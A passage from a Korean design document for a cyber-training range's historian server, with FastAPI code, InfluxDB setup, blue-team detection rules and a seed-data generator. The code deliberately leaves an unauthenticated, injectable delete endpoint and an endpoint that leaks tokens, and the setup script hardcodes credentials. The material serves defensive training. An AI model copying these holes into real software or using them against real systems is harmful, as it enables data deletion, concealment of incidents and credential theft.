        logger.error(f"쓰기 오류: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ★ VULN-3: 인증 없이 데이터 삭제 허용 ★
@app.delete("/api/data")
async def delete_data(
    tag: str,
    from_time: str = Query(alias="from"),
    to_time: str = Query(alias="to")
):
    """
    데이터 삭제
    ★ 취약점: 인증/인가 없음 → 공격자가 이력 데이터 삭제로 사고 은폐 가능
    """
    logger.info(f"DELETE /api/data — tag={tag}, from={from_time}, to={to_time}")

    try:
        delete_api = client.delete_api()
        delete_api.delete(
            start=from_time,
            stop=to_time,
            predicate=f'_measurement="{tag}"',   # ★ 입력값 직접 사용 (인젝션 가능)
            bucket=INFLUXDB_BUCKET,
            org=INFLUXDB_ORG
        )
        return {"status": "deleted", "tag": tag, "from": from_time, "to": to_time}

    except Exception as e:
        logger.error(f"삭제 오류: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ★ VULN-2: InfluxDB 토큰 및 내부 네트워크 정보 노출 ★
@app.get("/api/config")
async def get_config():
    """
    시스템 설정 조회
    ★★ CRITICAL: InfluxDB 토큰, SCADA IP 등 민감 정보 평문 노출 ★★
    """
    logger.info("GET /api/config — 설정 정보 조회 (★ 민감 정보 포함)")
    return {
        "influxdb_url": INFLUXDB_URL,
        "influxdb_org": INFLUXDB_ORG,
        "influxdb_bucket": INFLUXDB_BUCKET,
        "influxdb_token": INFLUXDB_TOKEN,       # ★★ 토큰 평문 노출 ★★
        "api_version": "1.0.0",
        "scada_endpoint": SCADA_HOST             # ★★ OT 네트워크 IP 노출 ★★
    }


# ─── 앱 시작 이벤트 ───────────────────────────────────────────────────
@app.on_event("startup")
async def startup_event():
    app.state.start_time = datetime.now(timezone.utc)
    logger.info("Historian API 서버 시작")
    logger.info(f"InfluxDB: {INFLUXDB_URL}, Org: {INFLUXDB_ORG}, Bucket: {INFLUXDB_BUCKET}")


@app.on_event("shutdown")
async def shutdown_event():
    client.close()
    logger.info("Historian API 서버 종료")


# ─── 메인 실행 ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="info")
```

### 8.8 InfluxDB 취약 설정 (config.yml)

```yaml
# /opt/historian/config/influxdb/config.yml
# InfluxDB 2.7 설정

bolt-path: /opt/historian/data/influxdb/bolt/influxd.bolt
engine-path: /opt/historian/data/influxdb/engine

http-bind-address: ":8086"

# ★ 취약점: 인증 비활성화 가능한 설정 (디버그 목적 — 제거되지 않음) ★
# auth-enabled: false  ← 주석 처리되어 있으나, 토큰 자체가 하드코딩

# 로깅 설정
log-level: info

# 스토리지 설정
storage-cache-max-memory-size: 1073741824    # 1GB
storage-cache-snapshot-memory-size: 26214400  # 25MB
storage-compact-full-write-cold-duration: "4h"

# ★ 보존 정책 — 수정 가능한 상태로 열려 있음 (VULN-5) ★
# 기본: 30일 보존. 공격자가 API 토큰으로 1초로 변경 시 전체 데이터 소멸
```

---

## 9. 블루팀 탐지 포인트

### 9.1 탐지 매트릭스

| ID | 탐지 포인트 | 로그 소스 | 탐지 규칙 | 심각도 |
|----|-----------|----------|----------|--------|
| DET-1 | 비인가 IP에서 API 접근 | API 접근 로그 | 화이트리스트 외 IP에서 /api/* 호출 | **HIGH** |
| DET-2 | /api/config 접근 | API 접근 로그 | GET /api/config 호출 감지 | **CRITICAL** |
| DET-3 | DELETE 요청 감지 | API 접근 로그 | DELETE /api/data 호출 | **CRITICAL** |
| DET-4 | 비정상 write 패턴 | API 접근 로그 + InfluxDB | 범위 밖 값, 빈번한 쓰기, 과거 타임스탬프 | **HIGH** |
| DET-5 | 데이터 갭 탐지 | InfluxDB 쿼리 | 5초 간격 데이터에서 공백 구간 발견 | **HIGH** |
| DET-6 | InfluxDB 직접 접근 | InfluxDB 접근 로그 | localhost 외 IP에서 :8086 직접 쿼리 | **HIGH** |
| DET-7 | Retention Policy 변경 | InfluxDB 감사 로그 | 버킷 보존 기간 변경 이벤트 | **CRITICAL** |

### 9.2 API 접근 로그 분석

**로그 위치:** `/opt/historian/logs/api-access.log`

**정상 패턴:**
```
2026-03-26 10:00:00 [INFO] GET /api/query — tag=temperature, from=-1h, to=now(), limit=100
2026-03-26 10:00:05 [INFO] GET /api/tags — 태그 목록 조회
```

**공격 탐지 패턴:**
```
# ★ DET-2: /api/config 접근 (토큰 탈취 시도)
2026-03-26 10:15:00 [INFO] GET /api/config — 설정 정보 조회 (★ 민감 정보 포함)

# ★ DET-3: DELETE 요청 (데이터 삭제/은폐)
2026-03-26 10:20:00 [INFO] DELETE /api/data — tag=temperature, from=2026-03-25T00:00:00Z, to=2026-03-26T00:00:00Z

# ★ DET-4: 비정상 write (허위 데이터 삽입)
2026-03-26 10:25:00 [INFO] POST /api/write — tag=temperature, value=999.9, ts=2026-03-26T10:00:00Z
2026-03-26 10:25:01 [INFO] POST /api/write — tag=fake_sensor, value=42.0, ts=None
```

### 9.3 InfluxDB 감사 로그 분석

**로그 위치:** `/var/log/influxdb/influxd.log` (심볼릭: `/opt/historian/logs/influxdb.log`)

**탐지 쿼리 — 비인가 접근 감지:**
```flux
// 최근 1시간 동안 localhost 외 IP에서의 InfluxDB 직접 접근 확인
from(bucket: "_monitoring")
  |> range(start: -1h)
  |> filter(fn: (r) => r._measurement == "http_api_request")
  |> filter(fn: (r) => r.remote_addr != "127.0.0.1")
  |> group(columns: ["remote_addr"])
  |> count()
```

### 9.4 데이터 갭 탐지

**탐지 쿼리 — 센서 데이터 공백 구간 확인:**
```flux
// 5초 간격 데이터에서 10초 이상 공백이 있는 구간 탐지
import "experimental"

from(bucket: "ot_data")
  |> range(start: -24h)
  |> filter(fn: (r) => r._measurement == "temperature")
  |> elapsed(unit: 1s)
  |> filter(fn: (r) => r.elapsed > 10)  // 정상: 5초, 10초 이상이면 갭
```

### 9.5 블루팀 대응 절차

1. **즉시 대응:**
   - OPNSense-4 규칙 강화: INT→Historian 접근을 192.168.92.206만 허용
   - `/api/config`, `/api/write`, `/api/data(DELETE)` 엔드포인트 비활성화
   - InfluxDB 토큰 로테이션

2. **증거 수집:**
   - API 접근 로그 보존: `/opt/historian/logs/api-access.log`
   - InfluxDB 감사 로그 보존
   - 네트워크 패킷 캡처 (OPNSense-4 미러링)

3. **사후 분석:**
   - 삭제된 데이터 시간대 파악 (데이터 갭 분석)
   - 삽입된 허위 데이터 식별 (값 범위 이상 탐지)
   - 공격자 접근 IP 및 시간대 타임라인 구성

---

## 10. 설치/구성 절차 개요

### 10.1 setup.sh

```bash
#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════
# Historian 서버 설치 스크립트
# 대상: Ubuntu 22.04 LTS (192.168.92.212)
#
# ★ 사이버 훈련용 — 의도적 취약점 포함 ★
# ═══════════════════════════════════════════════════════════════════════
set -e

echo "=== [1/7] 시스템 패키지 업데이트 ==="
apt-get update && apt-get upgrade -y

echo "=== [2/7] 필수 패키지 설치 ==="
apt-get install -y curl gnupg2 python3 python3-pip python3-venv ufw

echo "=== [3/7] InfluxDB 2.7 설치 ==="
wget -q https://repos.influxdata.com/influxdata-archive_compat.key
echo '393e8779c89ac8d958f81f942f9ad7fb82a25e133faddaf92e15b16e6ac9ce4c influxdata-archive_compat.key' | sha256sum -c -
cat influxdata-archive_compat.key | gpg --dearmor | tee /etc/apt/trusted.gpg.d/influxdata-archive_compat.gpg > /dev/null
echo 'deb [signed-by=/etc/apt/trusted.gpg.d/influxdata-archive_compat.gpg] https://repos.influxdata.com/debian stable main' | tee /etc/apt/sources.list.d/influxdata.list
apt-get update && apt-get install -y influxdb2

echo "=== [4/7] InfluxDB 초기 설정 ==="
systemctl enable influxdb
systemctl start influxdb
sleep 3

# InfluxDB 초기 설정 (setup)
influx setup \
  --host http://localhost:8086 \
  --org ot-org \
  --bucket ot_data \
  --username admin \
  --password 'Hist0rian!Influx#2024' \
  --token historian-dev-token-2024 \
  --retention 720h \
  --force

echo "=== [5/7] 디렉토리 구조 생성 ==="
mkdir -p /opt/historian/{app,config/influxdb,config/systemd,data/influxdb,logs,scripts}

# InfluxDB 설정 복사
cp /opt/historian/config/influxdb/config.yml /etc/influxdb/config.yml

echo "=== [6/7] Python 가상환경 및 API 서버 설치 ==="
python3 -m venv /opt/historian/app/venv
source /opt/historian/app/venv/bin/activate
pip install fastapi==0.104.1 uvicorn[standard]==0.24.0 influxdb-client==1.38.0 python-dotenv==1.0.0 pydantic==2.5.0

# .env 파일 생성
cat > /opt/historian/app/.env << 'ENVEOF'
HISTORIAN_API=http://192.168.92.212:8000
INFLUXDB_URL=http://192.168.92.212:8086
INFLUXDB_TOKEN=historian-dev-token-2024
INFLUXDB_ORG=ot-org
INFLUXDB_BUCKET=ot_data
SCADA_HOST=192.168.92.213
SCADA_PORT=502
ENVEOF

# systemd 서비스 등록
cat > /etc/systemd/system/historian-api.service << 'SVCEOF'
[Unit]
Description=Historian REST API Server
After=network.target influxdb.service
Requires=influxdb.service

[Service]
Type=simple
User=historian
Group=historian
WorkingDirectory=/opt/historian/app
Environment=PATH=/opt/historian/app/venv/bin:/usr/local/bin:/usr/bin
ExecStart=/opt/historian/app/venv/bin/uvicorn main:app --host 0.0.0.0 --port 8000 --log-level info
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable historian-api
systemctl start historian-api

echo "=== [7/7] 방화벽 (ufw) 설정 ==="
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow from 192.168.92.0/24 to any port 8000 proto tcp   # INT → API
ufw allow from 192.168.92.213/32 to any port 8086 proto tcp  # SCADA → InfluxDB
ufw allow from 127.0.0.1 to any port 8086 proto tcp          # 로컬 API → InfluxDB
ufw --force enable

echo "=== 시드 데이터 생성 ==="
python3 /opt/historian/scripts/seed_data.py

echo "=== 설치 완료 ==="
echo "  - InfluxDB: http://192.168.92.212:8086"
echo "  - REST API: http://192.168.92.212:8000"
echo "  - 토큰: historian-dev-token-2024"
```

### 10.2 서비스 확인

```bash
# InfluxDB 상태 확인
systemctl status influxdb
curl -s http://localhost:8086/health | jq

# API 서버 상태 확인
systemctl status historian-api
curl -s http://localhost:8000/api/health | jq

# 시드 데이터 확인
curl -s "http://localhost:8000/api/tags" | jq
curl -s "http://localhost:8000/api/query?tag=temperature&from=-1h" | jq
```

---

## 11. 시드 데이터

### 11.1 시드 데이터 설계

시드 데이터는 OT 환경의 실제 센서 데이터를 모방하여 사전 생성된다. 각 태그는 5초 간격으로 24시간 분량의 이력 데이터를 포함한다.

| 태그명 | 설명 | 단위 | 정상 범위 | 기본값 (중앙) | 변동폭 | 수집 주기 | 24시간 레코드 수 |
|--------|------|------|----------|-------------|--------|----------|----------------|
| temperature | 온도 | °C | 20.0 ~ 30.0 | 25.0 | ±2.0 | 5초 | 17,280 |
| pressure | 압력 | bar | 90.0 ~ 110.0 | 100.0 | ±5.0 | 5초 | 17,280 |
| flow_rate | 유량 | L/min | 100.0 ~ 200.0 | 150.0 | ±15.0 | 5초 | 17,280 |
| power | 전력 | V | 220.0 ~ 240.0 | 230.0 | ±3.0 | 5초 | 17,280 |

> **총 시드 레코드 수:** 약 69,120건 (4태그 x 17,280건)

### 11.2 데이터 패턴 설계

각 센서 데이터는 단순 랜덤이 아닌, 산업 현장의 실제 패턴을 모방한다:

1. **일주기 변동 (Diurnal Cycle):** 온도와 전력은 주간(09:00-18:00)에 약간 상승하는 사인파 패턴
2. **자연 잡음 (Natural Noise):** 가우시안 노이즈를 추가하여 자연스러운 변동
3. **점진적 드리프트 (Slow Drift):** 압력은 시간에 따라 미세하게 상승하는 경향
4. **간헐적 스파이크 (Occasional Spike):** 유량에 0.5% 확률로 짧은 스파이크 발생

### 11.3 시드 데이터 생성 스크립트 (seed_data.py)

```python
#!/usr/bin/env python3
"""
Historian 서버 시드 데이터 생성 스크립트
OT 센서 데이터 24시간 분량 생성

실행: python3 /opt/historian/scripts/seed_data.py
"""

import math
import random
from datetime import datetime, timedelta, timezone

from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

# ─── InfluxDB 접속 설정 ──────────────────────────────────────────────
INFLUXDB_URL = "http://192.168.92.212:8086"
INFLUXDB_TOKEN = "historian-dev-token-2024"
INFLUXDB_ORG = "ot-org"
INFLUXDB_BUCKET = "ot_data"

# ─── 시드 데이터 파라미터 ─────────────────────────────────────────────
INTERVAL_SECONDS = 5          # 수집 주기: 5초
DURATION_HOURS = 24            # 생성 기간: 24시간
BATCH_SIZE = 5000              # 배치 쓰기 크기

# 태그별 파라미터: (기본값, 변동폭, 일주기진폭, 드리프트율, 스파이크확률, 스파이크크기)
TAG_PARAMS = {
    "temperature": {
        "base": 25.0,          # 기본 온도 25°C
        "noise": 0.3,          # 가우시안 노이즈 표준편차
        "diurnal_amp": 2.0,    # 일주기 변동폭 (주간 +2°C)
        "drift_rate": 0.0,     # 드리프트 없음
        "spike_prob": 0.0,     # 스파이크 없음
        "spike_size": 0.0,
    },
    "pressure": {
        "base": 100.0,         # 기본 압력 100 bar
        "noise": 0.5,          # 가우시안 노이즈
        "diurnal_amp": 1.0,    # 일주기 변동 미미
        "drift_rate": 0.0002,  # 시간당 0.02% 미세 상승
        "spike_prob": 0.0,
        "spike_size": 0.0,
    },
    "flow_rate": {
        "base": 150.0,         # 기본 유량 150 L/min
        "noise": 2.0,          # 유량은 변동이 큼
        "diurnal_amp": 10.0,   # 주간 작업 시 유량 증가
        "drift_rate": 0.0,
        "spike_prob": 0.005,   # 0.5% 확률로 스파이크
        "spike_size": 30.0,    # 스파이크 크기: +30 L/min
    },
    "power": {
        "base": 230.0,         # 기본 전압 230V
        "noise": 0.5,          # 전압 변동
        "diurnal_amp": 3.0,    # 주간 부하 시 전압 변동
        "drift_rate": 0.0,
        "spike_prob": 0.001,   # 0.1% 확률로 순간 전압 변동
        "spike_size": 5.0,
    },
}


def generate_value(tag_name: str, timestamp: datetime, elapsed_hours: float) -> float:
    """
    산업용 센서 데이터 패턴을 모방하여 값 생성

    패턴 구성:
    1. 기본값 (base)
    2. 일주기 변동: sin 함수로 주간(09:00-18:00) 피크
    3. 가우시안 잡음: 자연스러운 미세 변동
    4. 점진적 드리프트: 시간에 따른 미세한 경향
    5. 간헐적 스파이크: 낮은 확률의 순간 변동
    """
    params = TAG_PARAMS[tag_name]

    # 1. 기본값
    value = params["base"]

    # 2. 일주기 변동 (시간 기반 사인파, 14시에 피크)
    hour = timestamp.hour + timestamp.minute / 60.0
    diurnal = params["diurnal_amp"] * math.sin(math.pi * (hour - 8) / 12)
    if 8 <= hour <= 20:
        value += diurnal

    # 3. 가우시안 잡음
    noise = random.gauss(0, params["noise"])
    value += noise

    # 4. 점진적 드리프트
    if params["drift_rate"] > 0:
        value += params["drift_rate"] * elapsed_hours * params["base"]

    # 5. 간헐적 스파이크
    if params["spike_prob"] > 0 and random.random() < params["spike_prob"]:
        spike_direction = random.choice([-1, 1])
        value += spike_direction * params["spike_size"]

    return round(value, 2)


def main():
    """시드 데이터 생성 및 InfluxDB 적재"""
    print("=" * 60)
    print("Historian 서버 시드 데이터 생성")
    print("=" * 60)

    # InfluxDB 연결
    client = InfluxDBClient(url=INFLUXDB_URL, token=INFLUXDB_TOKEN, org=INFLUXDB_ORG)
    write_api = client.write_api(write_options=SYNCHRONOUS)

    # 시간 범위 계산
    now = datetime.now(timezone.utc)
    start_time = now - timedelta(hours=DURATION_HOURS)
    total_points = int(DURATION_HOURS * 3600 / INTERVAL_SECONDS)  # 17,280 per tag

    print(f"  시작 시각: {start_time.isoformat()}")
    print(f"  종료 시각: {now.isoformat()}")
    print(f"  태그 수: {len(TAG_PARAMS)}")
    print(f"  태그당 포인트: {total_points:,}")
    print(f"  총 포인트: {total_points * len(TAG_PARAMS):,}")
    print()

    random.seed(42)  # 재현 가능한 시드

    for tag_name in TAG_PARAMS:
        print(f"  [{tag_name}] 생성 중...", end=" ", flush=True)

        batch = []
        for i in range(total_points):
            timestamp = start_time + timedelta(seconds=i * INTERVAL_SECONDS)
            elapsed_hours = i * INTERVAL_SECONDS / 3600.0

            value = generate_value(tag_name, timestamp, elapsed_hours)

            point = Point(tag_name) \
                .field("value", value) \
                .time(timestamp)

            batch.append(point)

            # 배치 쓰기
            if len(batch) >= BATCH_SIZE:
                write_api.write(bucket=INFLUXDB_BUCKET, org=INFLUXDB_ORG, record=batch)
                batch = []

        # 잔여 배치 쓰기
        if batch:
            write_api.write(bucket=INFLUXDB_BUCKET, org=INFLUXDB_ORG, record=batch)

        print(f"완료 ({total_points:,}건)")

    client.close()

    print()
    print("=" * 60)
    print(f"시드 데이터 생성 완료: 총 {total_points * len(TAG_PARAMS):,}건")
    print("=" * 60)


if __name__ == "__main__":
    main()
```

### 11.4 시드 데이터 검증

생성된 시드 데이터가 올바른지 확인하기 위한 검증 쿼리:

```bash
# 태그별 레코드 수 확인
curl -s "http://192.168.92.212:8000/api/query?tag=temperature&from=-24h&limit=5" | jq

# 예상 응답:
# {
#     "tag": "temperature",
#     "count": 5,
#     "data": [
#         {"time": "2026-03-25T10:00:00Z", "value": 24.73, "unit": "°C"},
#         {"time": "2026-03-25T10:00:05Z", "value": 24.81, "unit": "°C"},
#         {"time": "2026-03-25T10:00:10Z", "value": 24.65, "unit": "°C"},
#         {"time": "2026-03-25T10:00:15Z", "value": 24.92, "unit": "°C"},
#         {"time": "2026-03-25T10:00:20Z", "value": 24.78, "unit": "°C"}
#     ]
# }
```

```flux
// InfluxDB에서 직접 확인 — 태그별 통계
from(bucket: "ot_data")
  |> range(start: -24h)
  |> filter(fn: (r) => r._measurement == "temperature")
  |> count()
// 예상 결과: 약 17,280건

from(bucket: "ot_data")
  |> range(start: -24h)
  |> filter(fn: (r) => r._measurement == "temperature")
  |> mean()
// 예상 결과: 약 25.0 (기본값 근처)

from(bucket: "ot_data")
  |> range(start: -24h)
  |> filter(fn: (r) => r._measurement == "temperature")
  |> min()
// 예상 결과: 약 22.0 이상

from(bucket: "ot_data")
  |> range(start: -24h)
  |> filter(fn: (r) => r._measurement == "temperature")
  |> max()
// 예상 결과: 약 28.0 이하
```

---

> **문서 끝 — 자산 설계서 #12: Historian 서버 (OT History Data Server)**
>
> 이 문서는 사이버 훈련 환경 구축을 위한 기술 설계서이며, 포함된 취약점은 모두 훈련 목적으로 의도적으로 설계된 것이다.
